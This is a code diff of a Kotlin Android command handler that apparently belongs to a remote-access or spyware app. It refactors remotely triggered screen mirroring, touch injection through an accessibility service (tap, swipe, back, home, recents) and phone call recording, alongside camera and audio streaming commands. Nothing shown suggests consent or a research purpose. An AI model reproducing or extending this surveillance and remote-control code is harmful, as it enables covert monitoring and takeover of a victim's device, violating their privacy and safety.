@@ -38,7 +38,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
 
     private val TAG = "CSK4_CMD"
     private var webrtc: WebRTCService? = null
-    private var screenMirror: ScreenMirrorService? = null
 
     fun execute(command: String, params: JSONObject, onDone: (String) -> Unit) {
         Log.d(TAG, "Exec: $command")
@@ -98,31 +97,57 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 }
                 onDone("audio_started")
             }
-            "start_screen_mirror" -> {
-                screenMirror?.stop()
-                screenMirror = ScreenMirrorService(ctx, deviceId).apply {
-                    start()
-                }
-                onDone("screen_mirror_started")
-            }
-            "stop_screen_mirror" -> {
-                screenMirror?.stop()
-                screenMirror = null
-                onDone("screen_mirror_stopped")
-            }
             "stop_webrtc" -> { webrtc?.stop(); webrtc = null; onDone("stopped") }
             "switch_camera" -> { webrtc?.switchCamera(); onDone("switched") }
 
+            // ============ SCREEN MIRROR ============
+            "start_screen_mirror" -> {
+                // Screen mirror needs MainActivity to request permission
+                try {
+                    val intent = Intent(ctx, MainActivity::class.java)
+                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
+                    intent.putExtra("start_screen_mirror", true)
+                    ctx.startActivity(intent)
+                    onDone("screen_permission_requested")
+                } catch (e: Exception) {
+                    onDone("screen_mirror_fail: ${e.message}")
+                }
+            }
+            "stop_screen_mirror" -> {
+                ScreenMirrorService.instance?.stop()
+                ScreenMirrorService.instance = null
+                onDone("screen_mirror_stopped")
+            }
+
             // ============ TOUCH CONTROL ============
-            "touch_tap" -> { tap(params.optDouble("x", 0.5).toFloat(), params.optDouble("y", 0.5).toFloat()); onDone("tapped") }
-            "touch_swipe" -> { swipe(params.optDouble("x1", 0.3).toFloat(), params.optDouble("y1", 0.5).toFloat(), params.optDouble("x2", 0.7).toFloat(), params.optDouble("y2", 0.5).toFloat()); onDone("swiped") }
-            "touch_back" -> { pressBack(); onDone("back") }
-            "touch_home" -> { pressHome(); onDone("home") }
-            "touch_recent" -> { pressRecent(); onDone("recent") }
+            "touch_tap" -> {
+                val x = params.optDouble("x", 0.5).toFloat()
+                val y = params.optDouble("y", 0.5).toFloat()
+                TouchController().tap(x, y)
+                onDone("tapped")
+            }
+            "touch_swipe" -> {
+                val x1 = params.optDouble("x1", 0.3).toFloat()
+                val y1 = params.optDouble("y1", 0.5).toFloat()
+                val x2 = params.optDouble("x2", 0.7).toFloat()
+                val y2 = params.optDouble("y2", 0.5).toFloat()
+                TouchController().swipe(x1, y1, x2, y2)
+                onDone("swiped")
+            }
+            "touch_back" -> { TouchController().pressBack(); onDone("back") }
+            "touch_home" -> { TouchController().pressHome(); onDone("home") }
+            "touch_recent" -> { TouchController().pressRecent(); onDone("recent") }
 
             // ============ CALL RECORDING ============
-            "start_call_recording" -> { CallRecorder.startRecording(ctx); onDone("call_rec_started") }
-            "stop_call_recording" -> { CallRecorder.stopRecording(); onDone("call_rec_stopped") }
+            "start_call_recording" -> {
+                CallRecorder.init(ctx)
+                CallRecorder.startRecording(ctx, "", "manual")
+                onDone("call_rec_started")
+            }
+            "stop_call_recording" -> {
+                CallRecorder.stopRecording()
+                onDone("call_rec_stopped")
+            }
 
             else -> onDone("unknown: $command")
         }
@@ -290,32 +315,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 .build()
             nm.notify(System.currentTimeMillis().toInt(), notif)
         } catch (e: Exception) { Log.e(TAG, "Notif: ${e.message}") }
-    }
-
-    // ============ TOUCH CONTROL ============
-    private fun tap(x: Float, y: Float) {
-        val svc = ScreenshotService.instance ?: return
-        svc.performTap(x, y)
-    }
-
-    private fun swipe(x1: Float, y1: Float, x2: Float, y2: Float) {
-        val svc = ScreenshotService.instance ?: return
-        svc.performSwipe(x1, y1, x2, y2)
-    }
-
-    private fun pressBack() {
-        val svc = ScreenshotService.instance ?: return
-        svc.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
-    }
-
-    private fun pressHome() {
-        val svc = ScreenshotService.instance ?: return
-        svc.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
-    }
-
-    private fun pressRecent() {
-        val svc = ScreenshotService.instance ?: return
-        svc.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS)
     }
 
     // ============ LOCK ============
